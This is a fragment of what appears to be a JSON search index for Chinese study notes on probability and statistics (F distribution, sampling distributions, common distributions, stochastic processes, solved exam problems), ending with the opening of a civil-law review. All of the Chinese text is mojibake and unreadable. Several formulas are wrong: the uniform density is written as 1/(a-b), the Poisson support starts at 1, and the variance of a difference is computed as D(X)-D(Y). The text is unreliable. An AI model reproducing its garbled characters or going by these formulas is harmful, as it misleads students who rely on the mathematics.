æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼šï¼ˆæ‡’å¾—æŠ„äº†ï¼Œå¾ˆå¤æ‚å°±å¯¹äº†ï¼‰\næ€§è´¨ï¼š\n æ•°å­¦æœŸæœ›ä¸º $$\\displaystyle E(F) = \\frac{n_2}{n_2 - 2}, n_2 \u0026gt; 2$$  å®ƒçš„æ•°å­¦æœŸæœ›ä¸ä¾èµ–äºç¬¬ä¸€è‡ªç”±åº¦ $$n_1 $$    F åˆ†å¸ƒçš„åˆ†ä½æ•°ï¼š\n å¯¹äºç»™å®šçš„æ­£æ•° $$\\alpha, 0 \u0026lt; \\alpha \u0026lt; 1$$ï¼Œç§°æ»¡è¶³æ¡ä»¶ $$\\displaystyle P(F \u0026gt; F_{\\alpha}(n_1,n_2)) = \\int_{F_{\\alpha}(n_1,n_2)}^{\\infty} \\varphi(y) dy = \\alpha$$ çš„ç‚¹ $$F_{\\alpha}(n_1, n_2)$$ ä¸º $$F_{\\alpha}(n_1, n_2)$$ åˆ†å¸ƒä¸Šçš„ $$\\alpha$$ åˆ†ä½ç‚¹ã€‚ æœ‰ä¸€ä¸ªæ€§è´¨ï¼š$$\\displaystyle F_{1 - \\alpha}(n_1, n_2) = \\frac{1}{F_{\\alpha}(n_2, n_1)}$$  æŠ½æ ·åˆ†å¸ƒå®šç† #  è®¾æ€»ä½“ X çš„å‡å€¼ä¸º $$\\mu$$ï¼Œæ–¹å·®ä¸º $$\\sigma^2$$ï¼Œ$$X_1, X_2, \u0026hellip;, X_n$$ æ˜¯æ¥è‡ªæ€»ä½“çš„ä¸€ä¸ªæ ·æœ¬ï¼Œåˆ™æ ·æœ¬å‡å€¼ X å’Œæ ·æœ¬æ–¹å·® $$S^2$$ æœ‰ï¼š\n $$\\displaystyle E(\\overline{X}) = \\mu, D(\\overline{X}) = \\frac{\\sigma^2}{n}, E(S^2) = \\sigma^2$$  æ ·æœ¬å‡å€¼çš„åˆ†å¸ƒ #  è®¾ $$X_1, X_2, \u0026hellip;, X_n$$ æ˜¯æ¥è‡ªæ€»ä½“ $$N(\\mu, \\sigma^2)$$ çš„ä¸€ä¸ªæ ·æœ¬ï¼Œ$$\\overline{X}$$ æ˜¯æ ·æœ¬å‡å€¼ï¼Œ\nåˆ™æœ‰ï¼š$$\\displaystyle \\overline{X} \\sim N(\\mu, \\frac{\\sigma^2}{n})$$\næ ·æœ¬æ–¹å·®çš„åˆ†å¸ƒ #  è®¾ $$X_1, X_2, \u0026hellip;, X_n$$ æ˜¯æ¥è‡ªæ€»ä½“ $$N(\\mu, \\sigma^2)$$ çš„ä¸€ä¸ªæ ·æœ¬ï¼Œ$$\\overline{X}$$ å’Œ $$S^2$$ åˆ†åˆ«æ˜¯æ ·æœ¬å‡å€¼å’Œæ ·æœ¬æ–¹å·®ï¼Œåˆ™æœ‰ï¼š\n $$\\displaystyle \\frac{(n-1) S^2}{\\sigma^2} \\sim \\chi^2(n-1)$$ $$\\overline{X}$$ ä¸ $$S^2$$ ç‹¬ç«‹  ï¼ˆåé¢çš„æ‡’å¾—çœ‹äº†ï¼‰\n"},{"id":336,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/","title":"éšæœºå˜é‡çš„åˆ†å¸ƒ","section":"æ¦‚ç‡è®º","content":"å¸¸è§æ¦‚ç‡åˆ†å¸ƒæ€»ç»“ï¼š\n   åˆ†å¸ƒåç§° è®°å· åˆ†å¸ƒå¾‹æˆ–æ¦‚ç‡å¯†åº¦å‡½æ•° æ•°å­¦æœŸæœ› æ–¹å·®     ä¸¤ç‚¹åˆ†å¸ƒ $$X \\sim (0-1)$$ $$P(X = x) = p^{k}q^{1-k}$$\n$$x \\in {0,1}, 0 \\lt p \\lt 1, q = 1-p$$ $$p$$ $$pq$$   äºŒé¡¹åˆ†å¸ƒ $$X \\sim B(n, p)$$ $$P(X = k) = C_n^kp^kq^{n-k}$$\n$$k \\in {0, 1, \u0026hellip;, n}, 0 \\lt p \\lt 1, q = 1-p$$ $$np$$ $$npq$$   æ³Šæ¾åˆ†å¸ƒ $$X \\sim P(\\lambda)$$ $${\\displaystyle P(X = k) = \\frac{\\lambda^k}{k!}e^{-\\lambda}, k \\in {1,2,\u0026hellip;}, \\lambda \u0026gt; 0}$$ $$\\lambda$$ $$\\lambda$$   å‡åŒ€åˆ†å¸ƒ $$X \\sim U[a,b]$$ $$\\displaystyle f(x) = \\begin{cases}\\displaystyle \\frac{1}{a-b} \u0026amp;, a \\le x \\le b \\ 0 \u0026amp;, others \\end{cases}$$ $$\\displaystyle \\frac{a+b}{2}$$ $$\\displaystyle \\frac{(b-a)^2}{12}$$   æŒ‡æ•°åˆ†å¸ƒ $$X \\sim E(\\lambda)$$ $$\\displaystyle f(x) = \\begin{cases} \\lambda e^{-\\lambda x} \u0026amp;, x \u0026gt; 0 \\ 0 \u0026amp;, x \\le 0 \\end{cases}$$ $$\\displaystyle \\frac{1}{\\lambda}$$ $$\\displaystyle \\frac{1}{\\lambda^2}$$   æ­£æ€åˆ†å¸ƒ $$X \\sim N(\\mu, \\sigma^2)$$ $$\\displaystyle f(x) = \\frac{1}{\\sqrt{2 \\pi} \\sigma} e^{-\\frac{(x - \\mu)^2}{2 \\sigma^2}}, \\sigma \u0026gt; 0$$ $$\\mu $$ $$\\sigma^2$$    "},{"id":337,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E8%BF%87%E7%A8%8B/","title":"éšæœºè¿‡ç¨‹","section":"æ¦‚ç‡è®º","content":"éšæœºè¿‡ç¨‹ #  å®šä¹‰ #  éšæœºè¿‡ç¨‹ï¼ˆStochastic Processï¼‰çš„å®šä¹‰ï¼š\n è®¾éšæœºè¯•éªŒ E çš„æ ·æœ¬ç©ºé—´ $$S \\in {\\xi}$$ è‹¥å¯¹äºæ¯ä¸ªå…ƒç´  $$\\xi \\in S$$ æ€»æœ‰ä¸€ä¸ªç¡®çŸ¥çš„æ—¶é—´å‡½æ•° $$X(t, \\xi) t \\in Ts,$$ ä¸å®ƒå¯¹åº”ï¼Œå¯¹äºæ‰€æœ‰çš„ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ç°‡æ—¶é—´ t çš„å‡½æ•°ï¼Œç§°å®ƒä¸ºéšæœºè¿‡ç¨‹ã€‚ç°‡ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°ç§°ä¸ºæ ·æœ¬å‡½æ•°ã€‚ è‹¥å¯¹äºæ¯ä¸ªç‰¹å®šçš„æ—¶é—´ $$t_i(i = 1,2,\u0026hellip;)$$ï¼Œéƒ½æ˜¯éšæœºå˜é‡ï¼Œåˆ™ç§° $$X(t, \\xi)$$ ä¸ºéšæœºè¿‡ç¨‹ï¼Œ$$X(t_i, \\xi)$$ç§°ä¸ºéšæœºè¿‡ç¨‹ $$X(t)$$ åœ¨ $$t = t_i$$ æ—¶åˆ»çš„çŠ¶æ€ã€‚  å³æœ‰ï¼š\n   $$X(t, \\xi)$$ t å›ºå®š t å¯å˜     $$\\xi $$ å›ºå®š ç¡®å®šå€¼ æ—¶é—´å‡½æ•°   $$\\xi $$ å¯å˜ éšæœºå˜é‡ éšæœºè¿‡ç¨‹    æ¦‚ç‡åˆ†å¸ƒ #  ä¸€ç»´æ¦‚ç‡åˆ†å¸ƒ #  è®° $$F(x_i; t_i) = P(X(t_i) \\le x_i )$$ ä¸ºéšæœºè¿‡ç¨‹ $$X(t)$$ çš„ä¸€ç»´åˆ†å¸ƒå‡½æ•°ã€‚è‹¥ $$F(x, t)$$ çš„åå¯¼æ•°å­˜åœ¨ï¼Œåˆ™æœ‰ $$\\displaystyle f_X(x_i, t_i) = \\frac{\\part F_X(x_i, t_i)}{\\part x_i}$$\näºŒç»´æ¦‚ç‡åˆ†å¸ƒ #  ä¸ºäº†æè¿° Sï¼ŒP åœ¨ä»»æ„ä¸¤ä¸ªæ—¶åˆ» $$t_1$$ å’Œ $$t_2$$ çš„çŠ¶æ€é—´çš„å†…åœ¨è”ç³»,å¯ä»¥å¼•å…¥äºŒç»´éšæœºå˜é‡ $$[X(t_1),X(t_2)]$$ çš„åˆ†å¸ƒå‡½æ•°$$F_X(x1,x2;t1,t2)$$ï¼Œå®ƒæ˜¯äºŒéšæœºäº‹ä»¶ $${X(t_1) \\le x_1}, {X(t_2) \\le x_2 }$$ åŒæ—¶å‡ºç°çš„æ¦‚ç‡ï¼Œ\nå³ï¼š$$F_X(x1,x2;t1,t2) = P(X(t_1) \\le x_1, X(t_2) \\le x_2)$$ ç§°ä¸ºéšæœºè¿‡ç¨‹ $$ X(t) $$ çš„äºŒç»´åˆ†å¸ƒå‡½æ•°ã€‚\nè‹¥ $$F_X(x1,x2;t1,t2)$$ å¯¹ $$x_1, x_2$$ çš„æ··åˆåå¯¼å­˜åœ¨ï¼Œåˆ™ç§°ï¼š$$\\displaystyle f_X(x1,x2;t1,t2) = \\frac{\\part^2F_X(x1,x2;t1,t2)}{\\part x_1 \\part x_2}$$ ä¸ºéšæœºè¿‡ç¨‹ $$X(t)$$ çš„äºŒç»´æ¦‚ç‡å¯†åº¦ã€‚\nn ç»´æ¦‚ç‡åˆ†å¸ƒ #  ï¼ˆæ‡’å¾—å†™äº†ï¼‰\næ•°å­—ç‰¹å¾ #    å‡æ–¹å€¼ä¸æ–¹å·®ï¼š\n  æŠŠ $$X(t)$$ äºŒé˜¶åŸç‚¹çŸ©ç§°ä¸ºéšæœºè¿‡ç¨‹çš„å‡æ–¹å€¼ã€‚å³ï¼š$$\\displaystyle \\Psi^2_X(t) = E(X^2(t)) = \\int_{-\\infty}^{+\\infty} x^2f_X(x;t)dx$$\n  æŠŠ $$X(t)$$ äºŒé˜¶ä¸­å¿ƒçŸ©ç§°ä¸ºéšæœºè¿‡ç¨‹çš„æ–¹å·®ã€‚å³ï¼š$$\\displaystyle \\sigma^2_X(t) = D(X(t)) = E(X^2(t)) - E^2(X(t)) = \\Psi^2_X(t) - \\mu_X^2(t)$$\n    è‡ªç›¸å…³å‡½æ•°ï¼š\n å¯¹äºéšæœºè¿‡ç¨‹ $$X(t) $$ï¼Œå®šä¹‰å…¶è‡ªç›¸å…³å‡½æ•°ï¼š$$\\displaystyle R_{XX}(t_1, t_2) = E(X(t_1)X(t_2))$$ $$t_1 = t_2$$ æ—¶çš„è‡ªç›¸å…³å‡½æ•°æ˜¯éšæœºè¿‡ç¨‹çš„å‡æ–¹å€¼ã€‚    è‡ªåæ–¹å·®å‡½æ•°:\n  å¯¹äºéšæœºè¿‡ç¨‹ $$X(t) $$ï¼Œå®šä¹‰å…¶è‡ªåæ–¹å·®å‡½æ•°ï¼š$$C_{XX}(t_1, t_2) \\ = E[(X(t_1) - \\mu_X(t_1))(X(t_2) - \\mu_X(t_2))] \\ = R_X(t_1, t_2) - \\mu_X(t_1)\\mu_X(t_2)$$\n  $$t_1 = t_2$$ æ—¶çš„è‡ªç›¸å…³å‡½æ•°æ˜¯éšæœºè¿‡ç¨‹çš„æ–¹å·®ã€‚\n    äº’ç›¸å…³å‡½æ•°:\n å¯¹äºä¸åŒçš„éšæœºè¿‡ç¨‹ $$X(t)$$ å’Œ $$Y(t)$$ï¼Œåˆ™å®šä¹‰å…¶äº’ç›¸å…³å‡½æ•°ï¼š$$R_{XY}(t_1, t_2) = E[X(t_1)Y(t_2)]$$    äº’åæ–¹å·®å‡½æ•°ï¼š\n  å¯¹äºä¸åŒçš„éšæœºè¿‡ç¨‹ $$X(t)$$ å’Œ $$Y(t)$$ï¼Œåˆ™å®šä¹‰å…¶äº’åæ–¹å·®å‡½æ•°ï¼š$$C_{XY} (t_1, t_2) = E[(X(t_1) - \\mu_X(t_1))(Y(t_2) - \\mu_Y(t_2))]$$\n  å¯ä»¥è¯æ˜ï¼š$$C_{XY}(t_1, t_2) = R_{XY}(t_1, t_2) - \\mu_X(t_1)\\mu_Y(t_2)$$\n    "},{"id":338,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%A2%98%E7%9B%AE%E7%B2%BE%E8%A7%A3/","title":"é¢˜ç›®ç²¾è§£","section":"æ¦‚ç‡è®º","content":"é¢˜ç›® #  åˆ¤æ–­é¢˜ #  1 #   è®¾æœ‰åˆ†å¸ƒå¾‹ $${\\displaystyle P(X = (-1)^{n+1} \\frac{2^n}{n}) = \\frac{1}{2^n}}$$ï¼Œåˆ™ X çš„æ•°å­¦æœŸæœ›å­˜åœ¨ã€‚\n  é”™è¯¯ã€‚\n æ•°å­¦æœŸæœ›å®šä¹‰ï¼š\n  è®¾ç¦»æ•£å‹éšæœºå˜é‡ X çš„åˆ†å¸ƒå¾‹ä¸ºï¼š$$P(X = x_k) = p_k$$\nè‹¥çº§æ•° $${\\displaystyle \\sum_{k=1}^{\\infin} x_k p_k}$$ ç»å¯¹æ”¶æ•›ï¼Œåˆ™ç§° $${\\displaystyle \\sum_{k=1}^{\\infin} x_k p_k}$$ çš„å’Œä¸ºéšæœºå˜é‡ X çš„æ•°å­¦æœŸæœ›ï¼Œè®°ä¸º $$E(X)$$\nå³æœ‰ï¼š$$E(X) = {\\displaystyle \\sum_{k=1}^{\\infin} x_k p_k}$$\n  è®¾è¿ç»­å‹éšæœºå˜é‡ X çš„æ¦‚ç‡å¯†åº¦ä¸º f(x)\nè‹¥ç§¯åˆ† $${\\displaystyle \\int_{-\\infty}^{\\infty} x f(x) dx}$$ ç»å¯¹æ”¶æ•›ï¼Œåˆ™ç§°ç§¯åˆ† $${\\displaystyle \\int_{-\\infty}^{\\infty} x f(x) dx}$$ çš„å€¼ä¸ºéšæœºå˜é‡ X çš„æ•°å­¦æœŸæœ›ï¼Œè®°ä¸º $$E(X)$$\nå³ $$E(X) ={\\displaystyle \\int_{-\\infty}^{\\infty} x f(x) dx}$$\n  æ³¨æ„åˆ°ï¼Œæ•°å­¦æœŸæœ›è¦æ±‚ç»å¯¹æ”¶æ•›ï¼ŒåŸå› ï¼šhttps://math.stackexchange.com/questions/239949/why-do-we-require-absolute-convergence-in-the-definition-of-expectation\n2 #   åœ¨å‡è®¾æ£€éªŒä¸­ï¼Œæ˜¾è‘—æ€§æ°´å¹³ $$\\alpha$$ æ˜¯æŒ‡ï¼š$$P(æ‹’ç» H_0 \\mid H_0 ä¸ºå‡) = 1 - \\alpha$$\n  é”™è¯¯ã€‚\n æ¦‚å¿µï¼š\n  $$H_0$$ åŸå‡è®¾æˆ–é›¶å‡è®¾\n  $$H_1$$ å¤‡é€‰å‡è®¾æˆ–å¯¹ç«‹å‡è®¾\n  $$\\alpha $$ æ˜¯çŠ¯å¼ƒçœŸé”™è¯¯çš„æ¦‚ç‡\n  $$\\beta$$ æ˜¯çŠ¯å–ä¼ªé”™è¯¯çš„æ¦‚ç‡\n  å³å¦‚ä¸‹è¡¨æ ¼ï¼š\n    $$H_0$$ æˆç«‹ $$H_1$$ æˆç«‹     æ¥æ”¶ $$H_0$$ ä¸çŠ¯é”™ ç¬¬ II ç±»é”™è¯¯ï¼ˆå–ä¼ªé”™è¯¯ $$\\beta$$ï¼‰   æ‹’ç» $$H_0$$ ç¬¬ I ç±»é”™è¯¯ï¼ˆå¼ƒçœŸé”™è¯¯ $$ \\alpha $$ï¼‰ ä¸çŠ¯é”™    é€‰æ‹©é¢˜ #  1 #   è®¾äºŒç»´éšæœºå˜é‡ $$(X,Y) \\sim N(0, 0.5; 0, 0.5; 0)$$ï¼Œ$$Z = X - Y$$ï¼Œåˆ™æ–¹å·® $$D(|Z|)$$ ç­‰äºï¼š\nA. 0\tB. 1\tC. $$1 + {\\displaystyle \\frac{2}{\\pi}}$$\tD. $$1 - {\\displaystyle \\frac{2}{\\pi}}$$\n  D\n $$\\rho = 0 \\Rightarrow Cov(X, Y) = 0 \\Rightarrow E(XY) - E(X)E(Y) = 0 \\Rightarrow$$ Xï¼ŒY ç›¸äº’ç‹¬ç«‹\n$$E(Z) = E(X) - E(Y) = 0, D(Z) = D(X) - D(Y) = 1 \\Rightarrow Z \\sim N(0,1)$$\nå› æ­¤å¯ä»¥æ±‚å‡ºï¼š\n$${\\displaystyle E(|Z|) = \\int_{-\\infty}^{+\\infty}|z|\\cdot \\frac{1}{\\sqrt{2 \\pi}}e^{-\\frac{z^2}{2}} dz}$$\nÂ $${\\displaystyle = \\frac{2}{\\sqrt{2 \\pi}} \\cdot \\int_0^{+\\infty} z \\cdot e^{-\\frac{z^2}{2}} dz}â€‹$$\nÂ $${\\displaystyle = \\frac{2}{\\sqrt{2 \\pi}} \\cdot (-e)^{-\\frac{z^2}{2}} \\Big|_0^{+\\infty} = \\sqrt{\\frac{2}{\\pi}} }$$\n$${\\displaystyle E({|Z|}^2) = \\int_{-\\infty}^{+\\infty}z^2 \\cdot \\frac{1}{\\sqrt{2 \\pi}}e^{-\\frac{z^2}{2}} dz }$$\nÂ $${\\displaystyle= - \\frac{z}{\\sqrt{2 \\pi}} \\cdot e^{-\\frac{z^2}{2}} \\Big|{-\\infty}^{+\\infty} + \\int{-\\infty}^{+\\infty} \\frac{1}{\\sqrt{2 \\pi}}e^{-\\frac{z^2}{2}} dz}$$\nÂ $${\\displaystyle = 0 + 1 = 1 }$$\n$${\\displaystyle D(|Z|) = E(|Z|^2) - (E(|Z|))^2 = 1 - \\frac{2}{\\pi} }$$\n2 #   è®¾æ€»ä½“ $$X \\sim N(\\mu, \\sigma^2)$$ï¼Œ$$\\mu$$ ä¸ºæœªçŸ¥å‚æ•°ï¼Œæ ·æœ¬ $$X_1, X_2, \u0026hellip;, X_n$$ çš„æ–¹å·®ä¸º $$S^2$$ï¼Œå¯¹äºå‡è®¾æ£€éªŒ $$H_0: \\sigma \\ge 2, H_1: \\sigma \\lt 2$$ï¼Œæ˜¾è‘—æ€§æ°´å¹³ $$\\alpha$$ çš„æ‹’ç»åŸŸä¸ºï¼š\n$$(A). {\\displaystyle \\chi^2 = \\chi_{1 - \\frac{\\alpha}{2}}^2(n-1)}$$\n$$(B). {\\displaystyle \\chi^2 = \\chi_{1 - \\alpha}^2(n-1)}$$\n$$(C). {\\displaystyle \\chi^2 = \\chi_{1 - \\frac{\\alpha}{2}}^2(n)}$$\n$$(D). {\\displaystyle \\chi^2 = \\chi_{1 - \\alpha}^2(n)}$$\n  B\n å› ä¸º $$\\mu$$ æœªçŸ¥ï¼Œæ‰€ä»¥æ£€éªŒæ‰€ç”¨çš„ç»Ÿè®¡é‡ä»¥åŠå…¶æœä»çš„åˆ†å¸ƒæ˜¯ï¼š\n$${\\displaystyle \\chi^2 = \\frac{(n-1)S^2}{\\sigma_0^2} \\sim \\chi^2(n-1)}$$\n"},{"id":339,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%B0%91%E6%B3%95%E6%80%BB%E8%AE%BA/%E6%B0%91%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"æ°‘æ³•æœŸæœ«å¤ä¹ ","section":"æ°‘æ³•æ€»è®º","content":"æ°‘æ³•æ€»è®ºæœŸæœ«å¤ä¹  #  ç¬¬ä¸€ç«  å¯¼è®º #  ç¬¬3èŠ‚ æ°‘æ³•çš„æœ¬è´¨ #   æ°‘æ³•çš„åŸºæœ¬åŸç†ï¼Œç§æ³•è‡ªæ²»åŸåˆ™ã€‚  ç§æ³•è‡ªæ²»ï¼Œä¹Ÿç§°æ„æ€è‡ªæ²»ï¼ŒæŒ‡ç»æµç”Ÿæ´»å’Œå®¶åº­ç”Ÿæ´»ä¸­ä¸€åˆ‡æ°‘äº‹æƒåˆ©ä¹‰åŠ¡å…³ç³»çš„è®¾ç«‹ã€å˜æ›´å’Œæ¶ˆç­ï¼Œå‡æœ‰å½“äº‹äººè‡ªå·±å†³å®šï¼Œä¸€èˆ¬å›½å®¶ä¸ä½œå¹²é¢„ã€‚ ç§æ³•è‡ªæ²»çš„åŠŸèƒ½ï¼š(1)æ’é™¤ä¸ªäººæŸç¼š; (2)åºŸé™¤ç‰¹æƒ; (3)ä¿éšœç§æœ‰è´¢äº§; (4)ç»´æŠ¤ä¸ªäººè‡ªç”±ã€å°Šä¸¥ã€‚ ç§æ³•è‡ªæ²»åŸåˆ™çš„é™åˆ¶    ç¬¬4èŠ‚ æ°‘æ³•çš„æœ¬ä½ #   è¿‘ä»£æ°‘æ³•ä¸ºæƒåˆ©æœ¬ä½ï¼šæ³•å¾‹ä¹‹åŸºæœ¬ä»»åŠ¡ï¼Œç”±ä½¿äººå°½å…¶ä¹‰åŠ¡ä¿æŠ¤æƒåˆ©ï¼Œä¸ºä½¿æƒåˆ©ä¹‹å†…å®¹å¾—ä»¥å®ç°ï¼Œæ–¹æœ‰ä¹‰åŠ¡ä¹‹å±¥è¡Œï¼Œæ˜¯ä¸ºæƒåˆ©æœ¬ä½ã€‚å…¶ä½“ç°åœ¨è¿‘ä»£æ°‘æ³•ä¸‰å¤§åŸåˆ™ä¹‹ä¸­ï¼š  å¥‘çº¦è‡ªç”±åŸåˆ™ æ‰€æœ‰æƒç»å¯¹åŸåˆ™ è‡ªå·±è´£ä»»åŸåˆ™   ç¤¾ä¼šæœ¬ä½ï¼šä¸ºä½¿ç¤¾ä¼šå…±åŒç”Ÿæ´»ä¹‹å¢è¿›ï¼Œæ³•å¾‹å³å¼ºä½¿äººè´Ÿæ‹…ç‰¹å®šä¹‹ä¹‰åŠ¡ï¼Œé™åˆ¶æˆ–å‰¥å¤ºå…¶æŸç§æƒåˆ©ï¼Œæ­¤ä¸ºç§æ³•è‡ªæ²»ä¹‹é™åˆ¶ï¼Œæ˜¯ä¸ºç¤¾ä¼šæœ¬ä½ã€‚  å¥‘çº¦è‡ªç”±çš„é™åˆ¶ æ‰€æœ‰æƒç»å¯¹åŸåˆ™ä¹‹é™åˆ¶ æ— è¿‡é”™è´£ä»»åŸåˆ™ä¹‹é‡‡ç”¨    ç¬¬5èŠ‚ æ°‘æ³•çš„åŸºæœ¬åŸåˆ™ #   ä¸­å›½æ°‘æ³•çš„åŸºæœ¬åŸåˆ™  å¹³ç­‰åŸåˆ™ï¼šæŒ‡åœ¨æ°‘äº‹æ´»åŠ¨ä¸­ä¸€åˆ‡å½“æ—¶äººæ³•å¾‹åœ°ä½å¹³ç­‰ï¼Œä»»ä½•ä¸€æ–¹ä¸å¾—æŠŠè‡ªå·±çš„æ„å¿—å¼ºåŠ ç»™å¯¹æ–¹ã€‚  åŸºæœ¬å«ä¹‰ï¼šç»™äºˆä»–äººä»¥ç›¸åŒå¯¹å¾…ï¼›å°Šé‡å¯¹æ–¹çš„ä¸»ä½“æ€§ã€‚ å…·ä½“è¡¨ç°ï¼šæ°‘äº‹ä¸»ä½“çš„èµ„æ ¼å¹³ç­‰ï¼›æ°‘äº‹ä¸»ä½“çš„åœ°ä½å¹³ç­‰ï¼›æ°‘äº‹ä¸»ä½“çš„æ°‘äº‹æƒç›Šå¹³ç­‰çš„å—æ³•å¾‹ä¿æŠ¤ã€‚   åˆåŒè‡ªç”±åŸåˆ™ï¼šæŒ‡å‚åŠ æ°‘äº‹æ´»åŠ¨çš„å½“äº‹äººåœ¨æ³•å¾‹å…è®¸çš„èŒƒå›´å†…äº«æœ‰å®Œå…¨çš„è‡ªç”±ï¼ŒæŒ‰ç…§è‡ªå·±çš„è‡ªç”±æ„æ€å†³å®šç¼”ç»“åˆåŒå…³ç³»ï¼Œä¸ºè‡ªå·±è®¾å®šæƒåˆ©æˆ–å¯¹ä»–äººæ‰¿æ‹…ä¹‰åŠ¡ï¼Œä»»ä½•æœºå…³ã€ç»„ç»‡å’Œä¸ªäººä¸å¾—éæ³•å¹²é¢„ã€‚ å…¬å¹³åŸåˆ™ï¼šæŒ‡æ³•å¾‹è¡Œä¸ºå†…å®¹çš„ç¡®å®šï¼Œåº”å½“éµå¾ªå…¬å¹³çš„åŸåˆ™ã€‚å…¬å¹³åŸåˆ™çš„ä½“ç°  æƒåˆ©ä¸ä¹‰åŠ¡çš„å¹³è¡¡ è¡Œä¸ºä¸è´£ä»»çš„å¹³è¡¡ æ”¶ç›Šä¸é£é™©çš„å¹³è¡¡ åˆ©ç›Šä¸è´¡çŒ®çš„å¹³è¡¡   è¯šå®å®ˆä¿¡åŸåˆ™ï¼šæŒ‡æ°‘äº‹ä¸»ä½“åœ¨è¿›è¡Œæ°‘äº‹æ´»åŠ¨æ—¶ï¼Œåº”è¯šå®ä¸æ¬ºã€æªå®ˆè¯ºè¨€ï¼Œå¹¶ä¸”åˆç†ã€å–„æ„çš„æ–¹å¼è¡Œä½¿æƒåˆ©ã€å±¥è¡Œä¹‰åŠ¡ã€‚ å…¬åºè‰¯ä¿—åŸåˆ™ï¼šæ˜¯æŒ‡æ°‘äº‹ä¸»ä½“çš„è¡Œä¸ºåº”éµå®ˆå…¬å…±ç§©åºï¼Œç¬¦åˆå–„è‰¯é£ä¿—ï¼Œä¸å¾—è¿æ³•å›½å®¶çš„å…¬å…±ç§©åºå’Œç¤¾ä¼šçš„ä¸€èˆ¬é“å¾·ã€‚è¿åå…¬åºè‰¯ä¿—çš„å…·ä½“è¡¨ç°æœ‰ï¼š  å±å®³å›½å®¶ å±å®³å®¶åº­å…³ç³» è¿åæ€§é“å¾·çš„è¡Œä¸º å°„å¹¸è¡Œä¸ºï¼ˆæ‰€è°“å°„å¹¸åˆåŒæ˜¯æŒ‡å½“äº‹äººä¸€æ–¹æ˜¯å¦å±¥è¡Œä¹‰åŠ¡æœ‰èµ–äºå¶ç„¶äº‹ä»¶çš„å‡ºç°çš„ä¸€ç§åˆåŒï¼‰ è¿åäººæƒå’Œäººæ ¼å°Šä¸¥çš„è¡Œä¸º é™åˆ¶ç»æµè‡ªç”±çš„è¡Œä¸º è¿åå…¬å¹³ç«äº‰çš„è¡Œä¸º è¿åæ¶ˆè´¹è€…ä¿æŠ¤çš„è¡Œä¸º è¿ååŠ³åŠ¨è€…ä¿æŠ¤çš„è¡Œä¸º æš´åˆ©è¡Œä¸º   æƒåˆ©æ»¥ç”¨ä¹‹ç¦æ­¢è¡Œä¸ºï¼šæŒ‡ä¸€åˆ‡æ°‘äº‹æƒåˆ©ä¹‹è¡Œä½¿ï¼Œä¸å¾—è¶…è¿‡å…¶æ­£å½“ç•Œé™è‡´æœ‰æŸä»–äººåˆ©ç›Šæˆ–ç¤¾ä¼šå…¬ç›Šï¼Œè¡Œä½¿æƒåˆ©è¶…è¿‡ä¸ƒæ­£å½“ç•Œé™ï¼Œåˆ™æ„æˆæƒåˆ©æ»¥ç”¨ï¼Œåº”å½“æ‰¿æ‹…æ°‘äº‹è´£ä»»ã€‚  æƒåˆ©æ»¥ç”¨çš„æ„æˆçš„æ¡ä»¶ï¼šæœ‰æƒåˆ©çš„å­˜åœ¨ï¼Œæœ‰è¡Œä½¿æƒåˆ©çš„è¡Œä¸ºï¼Œæœ‰æ»¥ç”¨æƒåˆ©çš„è¿æ³•æ€§ï¼ˆå³å¯¹ä»–äººé€ æˆäº†ä¸å½“æŸå®³ï¼‰ ä¸»è§‚æ–¹é¢ï¼šæƒåˆ©äººçš„ä¸»è§‚ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†æŸå®³ä»–äººï¼›å®¢è§‚æ–¹é¢ï¼šæƒåˆ©äººçš„è¡Œä¸ºäº§ç”ŸæŸå®³ä»–äººåˆ©ç›Šçš„è¡Œä¸ºã€‚      ç¬¬6èŠ‚ æ°‘æ³•ä¸é‚»è¿‘æ³•å¾‹éƒ¨é—¨ #   æ³•å¾‹ä½“ç³»ï¼š  è´¢äº§æƒï¼š  å€ºæƒï¼šåˆåŒã€ä¾µæƒè¡Œä¸ºã€æ— å› ç®¡ç†ã€ä¸å½“å¾—åˆ© ç‰©æƒï¼šæ‰€æœ‰æƒã€ä»–ç‰©æƒï¼ˆç”¨ç›Šç‰©æƒã€æ‹…ä¿ç‰©æƒï¼‰ çŸ¥è¯†äº§æƒï¼šè‘—ä½œæƒã€å·¥ä¸šäº§æƒï¼ˆå•†æ ‡æƒã€ä¸“åˆ©æƒï¼ˆå‘æ˜ã€ä½¿ç”¨æ–°å‹ã€å¤–è§‚è®¾è®¡ï¼‰ï¼‰ã€å…¶ä»–   äººèº«æƒï¼š  äººæ ¼æƒï¼š  ä¸€èˆ¬äººæ ¼æƒï¼šç»™äºˆäººæ ¼ç‹¬ç«‹ã€è‡ªç”±ã€å¹³ç­‰å’Œå°Šä¸¥è¿™äº›ä¸€èˆ¬äººæ ¼åˆ©ç›Šè€Œäº«æœ‰çš„æƒåˆ© å…·ä½“äººæ ¼æƒï¼ˆç”Ÿå‘½æƒã€å¥åº·æƒã€èº«ä½“æƒã€å§“åæƒã€è‚–åƒæƒã€åèª‰æƒï¼‰   èº«ä»½æƒï¼š  äº²å±æ³•ä¸Šçš„èº«ä»½æƒï¼šäº²æƒã€äº²å±æƒã€é…å¶æƒ éäº²å±æ³•ä¸Šçš„èº«ä»½æƒï¼šè£èª‰æƒ        ç¬¬äºŒç«  æ°‘äº‹æ³•å¾‹å…³ç³» #  ç¬¬2èŠ‚ æ°‘äº‹æ³•å¾‹å…³ç³»çš„è¦ç´  #   